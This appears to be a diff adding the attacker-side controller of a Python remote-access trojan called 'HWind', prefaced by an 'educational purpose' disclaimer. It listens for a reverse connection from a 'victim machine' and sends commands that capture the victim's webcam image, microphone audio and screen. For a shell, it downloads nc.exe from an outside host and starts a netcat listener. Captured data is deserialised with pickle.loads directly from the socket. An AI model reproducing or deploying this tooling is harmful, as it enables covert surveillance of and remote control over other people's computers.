@@ -1,0 +1,107 @@
+## DISCLAIMER ##
+'''
+DO NOT MISUSE THIS
+I WILL NOT BE RESPONSIBLE FOR ANY HARM CAUSED BY THIS
+I DO NOT ENCOURAGE USING THIS
+THIS IS JUST FOR EDUCATIONAL PURPOSE
+IF YOU ARE TRYING THIS, MAKE SURE YOU HAVE THE PERMISSION OF THE VICTIM MACHINE's OWNER
+'''
+import socket
+import os
+import pickle
+import cv2
+from scipy.io.wavfile import write
+import pyautogui
+
+def clear():
+    if os.name == 'posix':
+        os.system('clear')
+    else:
+        os.system('cls')
+
+def recv(conn):
+    BYTE = 1024
+    MESSAGE = ''
+    while True:
+        part = conn.recv(BYTE).decode()
+        if len(part) < BYTE:
+            MESSAGE += part
+            return MESSAGE
+        else:
+            MESSAGE += part
+
+def recv_object(conn):
+    BYTE = 1024000
+    image = b''
+    while True:
+        part = conn.recv(BYTE)
+        if len(part) < BYTE:
+            image += part
+            return image
+        else:
+            image += part
+
+if __name__ == '__main__':
+    clear()
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    LHOST = '#LHOST#'
+    port = #port#
+    
+    s.bind((LHOST,port))
+    s.listen(1)
+    print('Listening for reverse connection...')
+
+    conn, addr = s.accept()
+    print(f'Connection recieved from {addr[0]}')
+    commands = ['shell', 'image', 'audio', 'screenshot', 'exit']
+    while True:
+        try:
+            command = input('\nHWind> ')
+        except KeyboardInterrupt:
+            print('Quitting...')
+            command = 'exit'.encode()
+            conn.send(command)
+            conn.close()
+            exit()
+        if command in commands:
+            if command == 'shell':
+                command = command.encode()
+                conn.send(command)
+                os.system('curl https://raw.githubusercontent.com/agpriyansh/netcat/main/nc.exe -o nc.exe')
+                try:
+                    os.system('nc.exe -nvlp 9001')
+                except KeyboardInterrupt:
+                    pass
+            elif command == 'image':
+                command = command.encode()
+                conn.send(command)
+                image = recv_object(conn)
+                image = pickle.loads(image)
+                cv2.imwrite('image.png', image)
+                print('Image Recieved!!!')
+            elif command == 'audio':
+                duration = input('For how long (in seconds) : ')
+                command = command.encode()
+                duration = duration.encode()
+                conn.send(command)
+                conn.send(duration)
+                recording = recv_object(conn)
+                recording = pickle.loads(recording)
+                write('recording.wav', 44100, recording)
+                print('Sound Recording Recieved!!')
+            elif command == 'screenshot':
+                command = command.encode()
+                conn.send(command)
+                screenshot = recv_object(conn)
+                screenshot = pickle.loads(screenshot)
+                screenshot.save('screenshot.png')
+                print('Screenshot Recieved!!')
+            elif command == 'exit':
+                print('Quitting...')
+                command = command.encode()
+                conn.send(command)
+                conn.close()
+                exit()
+        else:
+            print(f'Command not supported...\nList of supported commands are : {commands}')
